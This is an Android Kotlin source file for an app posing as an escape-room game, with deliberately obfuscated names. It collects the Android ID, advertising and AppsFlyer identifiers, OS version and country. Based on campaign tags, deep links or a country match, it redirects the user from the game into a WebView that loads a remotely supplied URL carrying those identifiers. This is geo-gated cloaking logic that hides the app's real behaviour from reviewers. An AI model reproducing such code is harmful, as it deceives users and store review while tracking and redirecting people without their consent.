package com.webelinx.Rooms.Exits.EscapeRoom.Fre.jcuxhd

import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import androidx.fragment.app.Fragment
import com.appsflyer.AppsFlyerLib
import com.my.tracker.MyTracker
import com.webelinx.Rooms.Exits.EscapeRoom.Fre.R
import com.webelinx.Rooms.Exits.EscapeRoom.Fre.Kiosuxygcgys.Companion.oakaskoa
import com.webelinx.Rooms.Exits.EscapeRoom.Fre.Kiosuxygcgys.Companion.ovkvcok
import com.webelinx.Rooms.Exits.EscapeRoom.Fre.nkicuxgyd.Bfrxyzyussasasass
import com.webelinx.Rooms.Exits.EscapeRoom.Fre.nkicuxgyd.Ewusiijxcuh
import org.koin.android.ext.android.inject
import org.koin.core.qualifier.named


class Eiwusudhwa : Fragment() {
    val ydygfdji: SharedPreferences by inject(named("SharedPreferences"))
    private lateinit var njcixusd: Context





    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)


        val roeokokdo = "sub_id_4="
        val kxiczhuhsuah = "sub_id_5="
        val riejijidjf = AppsFlyerLib.getInstance().getAppsFlyerUID(njcixusd)
        val uvchubhucv = Intent(activity, Bfrxyzyussasasass::class.java)

        AppsFlyerLib.getInstance().setCollectAndroidID(true)
        val ivcjb = "ad_id="
        val rijeji = ydygfdji.getString("mainId", null)
        val ncjxvijxc = Intent(activity, Ewusiijxcuh::class.java)
        val giofjid = ydygfdji.getString("apps", null)
        val mxcjn = Build.VERSION.RELEASE
        val rijidf = "com.webelinx.Rooms.Exits.EscapeRoom.Fre"
        val poodkofjijijiv = "naming"
        val kxixucuhhus = "deviceID="
        val fijifgji = ydygfdji.getString("deepSt", null)
        val ciivjjicvxuhhu = "deeporg"
        val woqokow = ydygfdji.getString(oakaskoa, null)
        val uivuchhvuc = ydygfdji.getString("country", null)
        val riodjifji = "sub_id_6="
        val rijdijsfkokoc = ydygfdji.getString("appCamp", null)
        val xuchhu = "sub_id_1="

        val tijjiijgf = ydygfdji.getString("wv", null)
        val ncjxivj = ydygfdji.getString("countryDev", null)


        val bvcvbijv = MyTracker.getTrackerParams()
        bvcvbijv.setCustomUserId(woqokow)


        ydygfdji.edit().putString(ovkvcok, riejijidjf).apply()

        val udycivxji = "$tijjiijgf$xuchhu$rijdijsfkokoc&$kxixucuhhus$riejijidjf&$ivcjb$rijeji&$roeokokdo$rijidf&$kxiczhuhsuah$mxcjn&$riodjifji$poodkofjijijiv"
        val qowijsjid = "$tijjiijgf$kxixucuhhus$woqokow&$ivcjb$woqokow&$roeokokdo$rijidf&$kxiczhuhsuah$mxcjn&$riodjifji$poodkofjijijiv"
        val vijcbhuhucv = "$tijjiijgf$xuchhu$fijifgji&$kxixucuhhus$riejijidjf&$ivcjb$rijeji&$roeokokdo$rijidf&$kxiczhuhsuah$mxcjn&$riodjifji$ciivjjicvxuhhu"
        val wowooskd = "$tijjiijgf$xuchhu$fijifgji&$kxixucuhhus$woqokow&$ivcjb$woqokow&$roeokokdo$rijidf&$kxiczhuhsuah$mxcjn&$riodjifji$ciivjjicvxuhhu"

        when(giofjid) {
            "1" ->
                if(rijdijsfkokoc!!.contains("tdb2")) {
                    ydygfdji.edit().putString("link", udycivxji).apply()
                    ydygfdji.edit().putString("WebInt", "campaign").apply()
                    startActivity(ncjxvijxc)
                    activity?.finish()
                } else if (fijifgji!=null||ncjxivj!!.contains(uivuchhvuc.toString())) {

                    ydygfdji.edit().putString("link", vijcbhuhucv).apply()
                    ydygfdji.edit().putString("WebInt", "deepLink").apply()
                    startActivity(ncjxvijxc)
                    activity?.finish()
                } else {
                    startActivity(uvchubhucv)
                    activity?.finish()
                }
            "0" ->
                if(fijifgji!=null) {
                    ydygfdji.edit().putString("link", wowooskd).apply()
                    ydygfdji.edit().putString("WebInt", "deepLinkNOApps").apply()
                    startActivity(ncjxvijxc)
                    activity?.finish()
                } else if (ncjxivj!!.contains(uivuchhvuc.toString())) {
                    Log.d("WebTesting", qowijsjid)
                    ydygfdji.edit().putString("link", qowijsjid).apply()
                    ydygfdji.edit().putString("WebInt", "geo").apply()
                    startActivity(ncjxvijxc)
                    activity?.finish()
                } else {
                    startActivity(uvchubhucv)
                    activity?.finish()
                }
        }
    }





    override fun onCreateView(
        inflater: LayoutInflater, container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View? {
        return inflater.inflate(R.layout.ncxuygds, container, false)
    }

    override fun onAttach(context: Context) {
        super.onAttach(context)
        njcixusd = context
    }
}
